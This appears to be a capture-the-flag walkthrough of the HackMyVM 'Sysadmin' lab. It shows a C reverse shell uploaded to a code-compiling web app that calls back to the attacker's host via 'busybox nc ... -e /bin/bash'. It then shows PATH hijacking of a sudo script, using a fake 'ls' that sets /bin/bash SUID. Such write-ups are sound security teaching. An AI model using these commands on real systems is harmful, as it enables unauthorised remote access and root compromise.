# 🔥 HackMyVM - Sysadmin Walkthrough

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackMyVM-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Category-Web%20Exploitation-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Privilege%20Escalation-PATH%20Hijacking-purple?style=for-the-badge">
</p>

---

# 📌 Overview

Today we are solving another **Easy Difficulty Linux Machine** from **HackMyVM** called **Sysadmin**.

This machine demonstrates several important real-world penetration testing concepts:

* Network Enumeration
* Service Enumeration
* Source Code Review
* Web Application Exploitation
* Reverse Shell Development
* Shell Stabilization
* Linux Privilege Escalation
* PATH Hijacking
* Sudo Misconfigurations

---

# 🎯 Target Information

| Information      | Value          |
| ---------------- | -------------- |
| Platform         | HackMyVM       |
| Machine          | Sysadmin       |
| Difficulty       | Easy           |
| Operating System | Linux          |
| Target IP        | 192.168.56.210 |

---

# 🔍 Initial Enumeration

## Full Port Scan

```bash
nmap -p- --min-rate 10000 192.168.56.210
```

### Results

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports are exposed:

* SSH (22)
* HTTP (80)

---

## Service Detection

```bash
nmap -sC -sV 192.168.56.210
```

### Results

```text
22/tcp open  ssh
OpenSSH 8.4p1 Debian

80/tcp open  http
Apache httpd 2.4.62 (Debian)

Title: C Code Upload
```

Interesting finding:

```text
C Code Upload
```

The web application appears to allow users to upload C source code.

---

# 🌐 Web Enumeration

Visiting the web application reveals a simple C source code uploader.

Before uploading anything, source code inspection is always recommended.

## View Source

Interesting comment discovered:

```html
<!--
gcc -std=c11 -nostdinc -I/var/www/include \
-z execstack \
-fno-stack-protector \
-no-pie \
test.c -o a.out
-->
```

---

## Analysis

This single comment tells us a lot:

### Compilation Flags

```bash
-z execstack
```

Executable stack enabled.

```bash
-fno-stack-protector
```

Stack protections disabled.

```bash
-no-pie
```

Position Independent Executables disabled.

```bash
-nostdinc
```

No standard include directories.

---

## Important Observation

The server is compiling and executing uploaded C code.

This means:

1. We can execute arbitrary code.
2. Standard includes may fail.
3. Reverse shell payloads must avoid unnecessary dependencies.

---

# 💣 Reverse Shell Exploitation

Created a minimal C reverse shell:

```c
int fork();
int execve(const char*, char*const[], char*const[]);

int main() {
    if (fork() == 0) {

        char *argv[] = {
            "/bin/sh",
            "-c",
            "busybox nc 192.168.56.106 4444 -e /bin/bash",
            0
        };

        execve(argv[0], argv, 0);
    }

    return 0;
}
```

---

## Listener

Attacker machine:

```bash
nc -lvnp 4444
```

---

## Shell Obtained

```text
Connection received on 192.168.56.210

uid=1000(echo)
gid=1000(echo)
groups=1000(echo)
```

Successfully gained access as:

```text
echo
```

---

# 🖥️ Shell Stabilization

Check Python:

```bash
which python3
```

Output:

```bash
/usr/bin/python3
```

Spawn PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```bash
CTRL + Z
```

Fix terminal:

```bash
stty raw -echo
fg
```

Export terminal:

```bash
export TERM=xterm
```

Fully interactive shell obtained.

---

# 🚩 User Flag

```bash
cat user.txt
```

Output:

```text
flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
```

---

# ⬆️ Privilege Escalation

## Sudo Enumeration

```bash
sudo -l
```

Output:

```text
User echo may run the following commands:

(root) NOPASSWD:
/usr/local/bin/system-info.sh
```

Interesting.

A script can be executed as root without a password.

---

# 🔎 Reviewing the Script

```bash
cat /usr/local/bin/system-info.sh
```

Contents:

```bash
#!/bin/bash

echo "Checking disk usage..."
df -h

echo "Checking log directory..."
ls -lh /var/log/

find /var/log/ -type f -name "*.gz" \
-mtime +30 \
-exec rm {} \;

echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron

echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m
```

---

# 🚨 Vulnerability Identification

The script executes multiple commands without using full paths.

Examples:

```bash
ls
cat
free
find
```

Because absolute paths are not specified, we can perform:

## PATH Hijacking

---

# 💀 Exploitation Method

Move to writable directory:

```bash
cd /tmp
```

Create malicious binary:

```bash
echo "chmod u+s /bin/bash" > ls
```

Make executable:

```bash
chmod +x ls
```

Modify PATH:

```bash
export PATH=/tmp:$PATH
```

Execute vulnerable script:

```bash
sudo PATH=/tmp:$PATH /usr/local/bin/system-info.sh
```

---

# 🎯 Why This Works

When root executes:

```bash
ls
```

The system searches:

```bash
PATH=/tmp:$PATH
```

Our malicious version is found first.

Therefore root executes:

```bash
chmod u+s /bin/bash
```

instead of the legitimate binary.

---

# 👑 Root Shell

Launch SUID Bash:

```bash
/bin/bash -p
```

Verify:

```bash
whoami
```

Output:

```text
root
```

Root access achieved.

---

# 🚩 Root Flag

```bash
more root.txt
```

Output:

```text
flag{root-8b8a8b353298f798e3eb8628661617b6}
```

---

# 🧠 Key Takeaways

### Web Exploitation

* Always inspect source code.
* Developer comments can reveal critical information.
* Understand compiler flags and their security impact.

### Reverse Shells

* Minimal payloads are often more reliable.
* Avoid unnecessary dependencies.

### Linux Privilege Escalation

* Always check:

```bash
sudo -l
```

* Review scripts executed with elevated privileges.
* Look for commands executed without absolute paths.

### PATH Hijacking

One of the most common privilege escalation techniques:

```bash
PATH=/tmp:$PATH
```

can become:

```bash
root compromise
```

when developers fail to use full command paths.

---

# 🏁 Conclusion

This machine was a great example of how a seemingly harmless code upload feature can quickly lead to full system compromise.

The attack chain was:

```text
Web Enumeration
      ↓
Source Code Review
      ↓
C Reverse Shell Upload
      ↓
User Access (echo)
      ↓
Sudo Enumeration
      ↓
PATH Hijacking
      ↓
Root Access
```

The machine highlights two major lessons:

1. Never trust user-supplied code execution.
2. Always use absolute paths in privileged scripts.

---

⭐ If you found this walkthrough useful, consider giving the repository a star.

🔐 Happy Hacking & Keep Learning.

Jai Shri Ram
